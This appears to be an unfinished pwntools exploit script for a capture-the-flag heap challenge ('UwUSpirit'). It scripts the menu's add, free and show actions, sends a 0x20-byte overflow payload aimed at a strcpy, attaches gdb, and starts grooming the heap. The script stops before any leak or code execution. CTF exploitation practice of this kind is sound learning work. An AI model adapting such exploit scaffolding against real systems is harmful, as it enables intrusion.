from pwn import * 

binary = "./UwUSpirit_patched"
p = process(binary)
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
context.log_level = 'debug'

s = '''
b *main+87
b * main+346
'''
# main+346 is strcpy

def add(index, size, content):
    p.sendlineafter(b'> ', b'UwU')
    p.sendlineafter(b'?\n', str(index).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b'UwU:\n', content)

def free(index):
    p.sendlineafter(b'> ', b'QAQ')
    p.sendlineafter(b'?\n', str(index).encode())

def show(index):
    p.sendlineafter(b'> ', b'awa')
    p.sendlineafter(b'?\n', str(index).encode())



payload = b'X' * 0x20  # Fills UUUwwUUU completely
p.send(payload)        # Use send instead of sendafter to avoid waiting for '> '

# Now the program should process this input and continue
p.recvuntil(b'UwU...')  # Wait for the strcpy to complete

# Next input for heap operations
p.sendline(b'UwU')  # Start heap operations

gdb.attach(p, s)

# Continue with your heap operations...
for i in range(6):
    add(i, 0x100, b'A'*0x100)

p.interactive()